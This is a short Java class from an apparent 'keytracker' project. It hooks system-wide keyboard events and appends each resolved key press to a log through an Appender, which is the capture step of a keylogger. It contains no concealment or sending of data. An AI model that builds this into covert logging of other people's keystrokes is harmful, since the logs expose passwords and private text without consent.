package com.keytracker;

import de.ksquared.system.keyboard.KeyEvent;
import de.ksquared.system.keyboard.KeyListener;

public class KeyListenerImpl implements KeyListener {

    private final KeyResolver keyResolver;
    private final Appender appender;

    public KeyListenerImpl(KeyResolver keyResolver, Appender appender) {
        this.keyResolver = keyResolver;
        this.appender = appender;
    }

    @Override
    public void keyPressed(KeyEvent keyEvent) {
//        printKeyCode(keyEvent);
//        printAsciFrom("{}:\"|");

        String resolvedKey = keyResolver.resolve(keyEvent);
        appender.append(resolvedKey);
    }

    @Override
    public void keyReleased(KeyEvent keyEvent) {
        //todo: implement ...
    }
}
